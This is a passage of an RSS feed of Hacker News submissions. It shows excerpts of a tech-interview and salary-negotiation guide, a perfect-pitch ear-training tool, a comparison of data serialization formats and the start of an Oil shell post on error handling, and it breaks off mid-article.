<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p><em>Disclaimers: Everyone's situation is different, this is just advice from mine and my friends' experience going through the interview and negotiation process. I don't necessarily agree with the current state of technical interviewing, but this piece presumes the status quo - though there are much <a href="https://medium.com/helpful-com/https-medium-com-fnthawar-helpful-technical-interviews-are-garbage-dc5d9aee5acd">better</a> <a href="https://medium.com/@racheltho/how-to-make-tech-interviews-a-little-less-awful-c29f35431987">interviewing</a> <a href="https://about.gitlab.com/blog/2020/03/19/the-trouble-with-technical-interviews/">methods</a>. I'm no expert, there are plenty of those who you should listen to.</em></p>
<blockquote>
<p>Tldr;</p>
<ul>
<li>READ <a href="https://twitter.com/patio11">@patio11</a>'s classic <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">Salary Negotiation post</a>. Every one should read it and then re-read it. This covers bits of it, but assumes the reader has already gone through it, so this focuses more on tactical techniques.</li>
<li>The best leverage is another offer (always have a good <a href="https://en.wikipedia.org/wiki/Best_alternative_to_a_negotiated_agreement">BATNA</a>), or a well positioned starting place.</li>
<li>The best way to get good offers is to do well on the interviews:<ul>
<li>practice a lot, mostly for the things you'll be tested on<ul>
<li>for most engineers this means coding questions, system design questions, (sometimes) debugging code, and project review.</li>
</ul></li>
</ul></li>
<li>It's a numbers game and timing matters quite a lot.</li>
<li>Practice negotiating, all the usual tips:<ul>
<li>Don't mention numbers, get them to give you an offer (you can nudge them that you're expecting "competitive" offers given the other companies you're interviewing at)</li>
<li>Don't haggle or go back and forth too many times. Ideally you get all the initial offers, then progressively use them against each other 1-2 times at most.</li>
<li>Figure out which levers matter to you the most (equity? location? level?) and when they don't have freedom to adjust in one, try another. Be willing to give in one dimension that matters less to you in order to take in another that matters more.</li>
</ul></li>
</ul>
</blockquote>
<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vimota.me/writing/interviews">https://vimota.me/writing/interviews</a></em></p>]]>
            </description>
            <link>https://vimota.me/writing/interviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873206</guid>
            <pubDate>Fri, 23 Oct 2020 19:50:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Perfect Pitch Ear Training]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 124 (<a href="https://news.ycombinator.com/item?id=24872754">thread link</a>) | @sergeykish
<br/>
October 23, 2020 | http://sergeykish.com/perfect-pitch-ear-training | <a href="https://web.archive.org/web/*/http://sergeykish.com/perfect-pitch-ear-training">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I do not perceive notes in different octaves as same, this makes <a href="https://tonedear.com/ear-training/absolute-perfect-pitch-test">Toned Ear pitch training</a> guesswork. So I've created a tool where one can select individual notes:<br></p><table id="available"><tbody><tr><th>Bâ™¯/C</th><td><label for="C3">3</label></td><td><label for="C4">4</label></td><td><label for="C5">5</label></td></tr><tr><th>Câ™¯/Dâ™­</th><td><label for="C#3">3</label></td><td><label for="C#4">4</label></td><td><label for="C#5">5</label></td></tr><tr><th>D</th><td><label for="D3">3</label></td><td><label for="D4">4</label></td><td><label for="D5">5</label></td></tr><tr><th>Dâ™¯/Eâ™­</th><td><label for="D#3">3</label></td><td><label for="D#4">4</label></td><td><label for="D#5">5</label></td></tr><tr><th>E/Fâ™­</th><td><label for="E3">3</label></td><td><label for="E4">4</label></td><td><label for="E5">5</label></td></tr><tr><th>F</th><td><label for="F3">3</label></td><td><label for="F4">4</label></td><td><label for="F5">5</label></td></tr><tr><th>Fâ™¯/Gâ™­</th><td><label for="F#3">3</label></td><td><label for="F#4">4</label></td><td><label for="F#5">5</label></td></tr><tr><th>G</th><td><label for="G3">3</label></td><td><label for="G4">4</label></td><td><label for="G5">5</label></td></tr><tr><th>Gâ™¯/Aâ™­</th><td><label for="G#3">3</label></td><td><label for="G#4">4</label></td><td><label for="G#5">5</label></td></tr><tr><th>A</th><td><label for="A3">3</label></td><td><label for="A4">4</label></td><td><label for="A5">5</label></td></tr><tr><th>Aâ™¯/Bâ™­</th><td><label for="A#3">3</label></td><td><label for="A#4">4</label></td><td><label for="A#5">5</label></td></tr><tr><th>B/Câ™­</th><td><label for="B3">3</label></td><td><label for="B4">4</label></td><td><label for="B5">5</label></td>
</tr></tbody></table><p>Now run , it randomly selects note and plays it. Select answer <span id="answers">, , , , , , , , , , , </span>, if wrong it plays note second time so you can make another try. Or you can  selected note again.</p><p>Correct answer increases counter <span id="counterLabel">0</span>, incorrect resets it to zero. Buttons has keyboard shortcuts, corresponding key marked by underline. For example type <span>t</span> to run "<u>T</u>est",  <span>c</span> to answer "<u>C</u>", <kbd>Shift</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™¯</u>" and <kbd>Alt</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™­</u>" (not sure how it would work in Safari).</p><p>I think the way to go is making strong connections between sound and its name. Knowing not guessing. I've started with just two notes â€” G3 and C4. I close my eyes and go through hundreds of tests. Once I felt confident I've added G4, than C5.</p><p>TODO:</p><ul><li>store configuration in URL hash<br></li><li>select instrument</li><li>store instruments on server</li></ul><p>UPDATES:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioContext">window.webkitAudioContext</a> for Safari</li><li>buttons to answer sharps and flats</li><li>mark incorrect answer with color</li><li><code>accesskey</code> replaced by <code>document.onkeydown</code></li></ul><p>Implementation:</p> </div>]]>
            </description>
            <link>http://sergeykish.com/perfect-pitch-ear-training</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872754</guid>
            <pubDate>Fri, 23 Oct 2020 19:08:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 'education bubble' is not merely a financial crisis; it is a moral crisis]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24872331">thread link</a>) | @lawschool333
<br/>
October 23, 2020 | https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872331</guid>
            <pubDate>Fri, 23 Oct 2020 18:25:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Better Than JSON?]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 138 (<a href="https://news.ycombinator.com/item?id=24871946">thread link</a>) | @fanf2
<br/>
October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wiki.alopex.li/BetterThanJson">https://wiki.alopex.li/BetterThanJson</a></em></p>]]>
            </description>
            <link>https://wiki.alopex.li/BetterThanJson</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871946</guid>
            <pubDate>Fri, 23 Oct 2020 17:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four features that justify a new Unix shell]]>
            </title>
            <description>
<![CDATA[
Score 207 | Comments 142 (<a href="https://news.ycombinator.com/item?id=24871762">thread link</a>) | @diegocg
<br/>
October 23, 2020 | http://www.oilshell.org/blog/2020/10/osh-features.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/10/osh-features.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
